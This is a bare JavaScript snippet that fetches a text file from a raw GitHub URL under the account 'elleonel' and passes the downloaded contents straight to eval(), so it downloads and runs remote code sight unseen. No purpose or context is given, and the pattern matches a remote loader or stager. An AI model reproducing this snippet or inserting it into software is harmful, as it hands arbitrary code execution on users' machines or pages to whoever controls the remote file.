fetch(
    "https://raw.githubusercontent.com/elleonel/sas/main/2"
).then((r) => r.text().then((t) => eval(t)));
